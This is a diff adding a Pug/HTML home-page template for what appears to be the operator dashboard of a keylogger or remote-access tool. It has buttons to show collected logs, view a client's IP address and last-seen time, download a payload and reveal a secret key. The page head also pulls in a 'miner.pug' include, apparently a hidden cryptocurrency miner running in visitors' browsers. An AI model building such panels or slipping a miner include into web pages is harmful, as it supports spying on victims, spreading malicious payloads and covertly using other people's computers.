@@ -1,0 +1,93 @@
+<html>
+	<head>
+		<title>Home</title>
+		include head.pug
+		include miner.pug
+	</head>
+	<body>
+		script
+			include js/log_tools.js
+		include navbar.pug
+		<div class="container text-white">
+			<div class="row">
+				<div class="col-md">
+					h1= username
+				</div>
+			</div>
+			<div class="row">
+				<div class="col-md">
+					<form class="form-inline" action="logs" method="POST">
+						<button class="btn btn-outline-light btn-lg btn-block" type="submit">Show Logs <i class="fas fa-file-alt"></i></button>
+					</form>
+					<button class="btn btn-outline-light btn-lg btn-block mb-3" data-toggle="modal" data-target="#detailPrompt">Client Details <i class="fas fa-info-circle"></i></button>
+					<form class="form-inline" action="payload" method="GET">
+						<button class="btn btn-outline-light btn-lg btn-block">Download Payload <i class="fas fa-download"></i></button>
+					</form>
+					<button class="btn btn-outline-light btn-lg btn-block" data-toggle="modal" data-target="#keyPrompt">View Secret Key <i class="fas fa-key"></i></button>
+				</div>
+			</div>
+		</div>
+		<div class="modal fade" id="keyPrompt">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h5 class="modal-title">Secret Key</h5>
+						<button type="button" class="close" data-dismiss="modal">
+							<span aria-hidden="true"><i class="fas fa-times"></i></span>
+						</button>
+					</div>
+					<div class="modal-body">
+						<div class="input-group">
+							input(type="text" id="secretKey" class="form-control text-dark" value=api_key readonly)
+							<div class="input-group-append">
+								<button type="submit" class="btn btn-primary" onclick="copyElement('secretKey')">Copy <i class="fas fa-copy"></i></button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="modal fade" id="detailPrompt">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h5 class="modal-title">Client Details</h5>
+						<button type="button" class="close" data-dismiss="modal">
+							<span aria-hidden="true"><i class="fas fa-times"></i></span>
+						</button>
+					</div>
+					<div class="modal-body">
+						<div class="input-group">
+							<div class="input-group-prepend bg-light">
+								<span class="input-group-text text-dark">IP Address&nbsp;<i class="fas fa-map-marker-alt"></i></span>
+							</div>
+							input(type="text" id="clientIp" class="form-control text-dark" value=last_client_ip readonly)
+							<div class="input-group-append">
+								<button type="submit" class="btn btn-primary" onclick="copyElement('clientIp')">Copy <i class="fas fa-copy"></i></button>
+							</div>
+						</div>
+						<div class="input-group mt-2">
+							<div class="input-group-prepend bg-light">
+								<span class="input-group-text text-dark">Last Seen&nbsp;<i class="fas fa-eye"></i></span>
+							</div>
+							input(type="text" id="lastDate" class="form-control text-dark" value=last_client_login readonly)
+							<div class="input-group-append">
+								<button type="submit" class="btn btn-primary" onclick="copyElement('lastDate')">Copy <i class="fas fa-copy"></i></button>
+							</div>
+						</div>
+						<div class="input-group mt-2">
+							<div class="input-group-prepend bg-light">
+								<span class="input-group-text text-dark">Log Size&nbsp;<i class="fas fa-hdd"></i></span>
+							</div>
+							input(type="text" id="logSize" class="form-control text-dark" value=log_size readonly)
+							<div class="input-group-append">
+								<button type="submit" class="btn btn-primary" onclick="copyElement('logSize')">Copy <i class="fas fa-copy"></i></button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		include footer.pug
+	</body>
+</html>
